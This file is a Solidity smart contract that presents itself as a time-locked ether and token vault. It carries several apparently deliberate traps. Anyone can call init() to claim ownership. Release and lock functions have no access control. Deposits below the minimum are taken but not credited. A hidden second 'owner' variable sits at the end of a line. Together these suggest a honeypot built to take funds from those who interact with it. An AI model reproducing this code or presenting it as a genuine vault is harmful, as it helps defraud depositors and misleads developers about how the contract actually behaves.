1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 //
3 // This is free software and you are welcome to redistribute it under certain conditions.
4 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
5 //
6 pragma solidity ^0.4.14;
7 
8 contract Ownable {
9     address Owner = msg.sender;
10     modifier onlyOwner { if (msg.sender == Owner) _; }
11     function transferOwnership(address to) public onlyOwner { Owner = to; }
12 }
13 
14 // tokens are withdrawable
15 contract TokenVault is Ownable {
16     function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
17         return token.call(bytes4(0xa9059cbb), to, amount);
18     }
19 }
20 
21 // store ether & tokens for a period of time
22 contract Vault is TokenVault {
23     
24     event Deposit(address indexed depositor, uint amount);
25     event Withdrawal(address indexed to, uint amount);
26     event OpenDate(uint date);
27 
28     mapping (address => uint) public Deposits;
29     uint minDeposit;
30     bool Locked;
31     uint Date;
32 
33     function init() payable open {
34         Owner = msg.sender;
35         minDeposit = 0.5 ether;
36         Locked = false;
37         deposit();
38     }
39     
40     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
41     function ReleaseDate() public constant returns (uint) { return Date; }
42     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
43 
44     function() public payable { deposit(); }
45 
46     function deposit() public payable {
47         if (msg.value > 0) {
48             if (msg.value >= MinimumDeposit())
49                 Deposits[msg.sender] += msg.value;
50             Deposit(msg.sender, msg.value);
51         }
52     }
53 
54     function setRelease(uint newDate) public { 
55         Date = newDate;
56         OpenDate(Date);
57     }
58 
59     function withdraw(address to, uint amount) public onlyOwner {
60         if (WithdrawEnabled()) {
61             uint max = Deposits[msg.sender];
62             if (max > 0 && amount <= max) {
63                 to.transfer(amount);
64                 Withdrawal(to, amount);
65             }
66         }
67     }
68 
69     function lock() public { Locked = true; } address owner;
70     modifier open { if (!Locked) _; owner = msg.sender; }
71     function kill() public { require(this.balance == 0); selfdestruct(Owner); }
72     function getOwner() external constant returns (address) { return owner; }
73 }